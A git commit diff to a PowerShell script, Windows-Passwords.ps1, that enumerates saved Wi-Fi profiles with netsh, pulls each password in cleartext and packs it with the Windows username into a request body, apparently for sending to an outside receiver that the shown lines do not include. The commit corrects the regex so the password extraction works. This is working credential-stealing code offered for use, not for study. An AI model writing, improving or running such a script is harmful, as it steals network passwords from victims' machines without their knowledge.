63e4abfd1a4362c1fb410272fbfa71e93b610f3d
KingCorgi101 <leogmasters@gmail.com>
2025-04-16 20:41:08 -0400

    Update Windows-Passwords.ps1

--- Windows-Passwords.ps1
+++ Windows-Passwords.ps1
@@ -2,7 +2,7 @@
 # ENG
 netsh wlan show profile | Select-String '(?<=All User Profile\s+:\s).+' | ForEach-Object {
     $wlan  = $_.Matches.Value
-    $passw = netsh wlan show profile $wlan key=clear | Select-String '(?<=Wifi Pass:\s+:\s).+'
+    $passw = netsh wlan show profile $wlan key=clear | Select-String '(?<=Key Content\s+:\s).+'
 
 	$Body = @{
 		'username' = $env:username + " | " + [string]$wlan
